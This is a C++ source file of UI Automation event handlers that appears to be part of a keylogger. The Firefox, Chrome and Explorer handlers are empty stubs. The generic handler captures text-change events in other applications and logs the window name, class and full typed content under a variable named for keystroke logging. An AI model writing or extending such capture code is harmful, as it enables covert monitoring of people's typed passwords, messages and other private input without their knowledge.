#include "MyAutomationEventHandlerApps.h"
#include "MyAutomationEventHandler.h"
#include "Logger.h"

void MyAutomationEventHandler::HandleFirefox(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleFirefox() Invoked", DBG);
	Log(L"Todo :))", INFO);
}

void MyAutomationEventHandler::HandleChrome(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleChrome() Invoked", DBG);
	Log(L"Todo :))", INFO);
}

void MyAutomationEventHandler::HandleExplorer(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleExplorer() Invoked", DBG);
	Log(L"Todo :))", INFO);
}

void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleOther() Invoked", DBG);
	BSTR bWindowName;
	BSTR bClassName;

	VARIANT vValue;
	VARIANT vHelp;
	VariantInit(&vValue);
	VariantInit(&vHelp);

	std::wstring wsLogKeyStroke = wsDate + L" " + wsProcName + L" [" + wsEventString + L"]";

	switch (eventID)
	{
	case UIA_Text_TextChangedEventId:

		pAutomationElement->get_CurrentName(&bWindowName);
		pAutomationElement->get_CurrentClassName(&bClassName);
		pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, &vHelp);
		pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vValue);

		if (std::wstring(vValue.bstrVal) == oldTextValue)
		{
			break;
		}

		wsLogKeyStroke += L"\n\tWindow: " + std::wstring(bWindowName);
		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
		wsLogKeyStroke += L"\n--------------[CONTENT]--------------\n" + std::wstring(vValue.bstrVal) + L"\n--------------[CONTENT]--------------";

		oldTextValue = std::wstring(vValue.bstrVal);

		Log(wsLogKeyStroke, EMPTY);
		break;

	case UIA_Invoke_InvokedEventId:
		break;
	
	case UIA_Window_WindowOpenedEventId:
		break;

	default:
		Log(L"Arrived unknown event. How to process that? :)" + wsEventString, INFO);
	}

	VariantClear(&vHelp);
	VariantClear(&vValue);
}